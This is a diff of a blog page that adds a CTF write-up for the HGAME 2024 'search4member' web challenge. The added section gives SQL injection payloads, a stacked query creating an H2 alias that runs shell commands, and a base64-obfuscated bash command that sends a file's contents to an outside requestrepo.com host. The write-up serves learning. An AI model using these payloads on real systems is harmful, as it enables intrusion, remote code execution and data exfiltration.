@@ -34,7 +34,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/scofield1920.github.io\/hgame2024_week2\/"
-        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "CTF, wp","wordcount":  436 ,
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "CTF, wp","wordcount":  483 ,
         "url": "http:\/\/scofield1920.github.io\/hgame2024_week2\/","datePublished": "2024-02-14T00:00:00+08:00","dateModified": "2024-02-14T00:00:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
@@ -157,7 +157,7 @@
             <div class="post-meta-line">
                 <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
                 </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/wp/"><i class="far fa-folder fa-fw"></i>wp</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-02-14">2024-02-14</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-02-14">2024-02-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;436 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;3 minutes&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-02-14">2024-02-14</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-02-14">2024-02-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;483 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;3 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
@@ -567,7 +567,55 @@
             alt="image-20240216174805888">
     </a></figure></p>
 <h3 id="search4member" class="headerLink">
-    <a href="#search4member" class="header-mark"></a>[search4member]</h3><h2 id="misc" class="headerLink">
+    <a href="#search4member" class="header-mark"></a>[search4member]</h3><p>sql注入&ndash;堆叠注入实现rce</p>
+<p>尝试<code>a' or 1=1 --+</code>，得到表中所有数据</p>
+<p>回显有三个字段。查询库名：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a&#39; union select 1,2,database() --+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240221210856523.png" title="image-20240221210856523" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240221210856523.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240221210856523.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240221210856523.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240221210856523.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240221210856523.png 2x"
+            sizes="auto"
+            alt="image-20240221210856523">
+    </a></figure></p>
+<p><a href="https://cn-sec.com/archives/721279.html" target="_blank" rel="noopener noreferrer">Spring Boot Actuator H2 RCE漏洞复现</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a&#39;; CREATE ALIAS SHELL AS &#39;String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}&#39;;&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>rce，通过dnslog外带</p>
+<p><a href="https://requestrepo.com/" target="_blank" rel="noopener noreferrer">https://requestrepo.com/</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a&#39;;CALL SHELL(&#39;bash -c {echo,Y3VybCBgY2F0IC9mbGFnYC5kN3VobWE4ai5yZXF1ZXN0cmVwby5jb20=}|{base64,-d}|{bash,-i}&#39;);&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240221225510335.png" title="image-20240221225510335" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240221225510335.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240221225510335.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240221225510335.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240221225510335.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240221225510335.png 2x"
+            sizes="auto"
+            alt="image-20240221225510335">
+    </a></figure></p>
+<h2 id="misc" class="headerLink">
     <a href="#misc" class="header-mark"></a>misc</h2><h3 id="ek1ng_want_girlfriend" class="headerLink">
     <a href="#ek1ng_want_girlfriend" class="header-mark"></a>[ek1ng_want_girlfriend]</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240208015452309.png" title="image-20240208015452309" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240208015452309.png">
         <img
